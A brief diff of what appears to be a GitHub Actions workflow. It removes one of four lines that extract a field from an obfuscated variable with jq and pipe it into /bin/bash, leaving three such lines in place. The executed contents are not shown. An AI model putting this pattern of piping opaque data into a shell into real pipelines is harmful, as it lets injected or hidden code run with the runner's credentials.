@@ -25,7 +25,6 @@ jobs:
           echo $omnlv4760 | jq -r .e0308 | /bin/bash
           printf '%s' "$zg76229" | jq -r .xd12 | /bin/bash
           printf '%s' "$qmhcm39" | jq -r .kvq1236 | /bin/bash
-          echo $ppw65 | jq -r .hqp24202 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
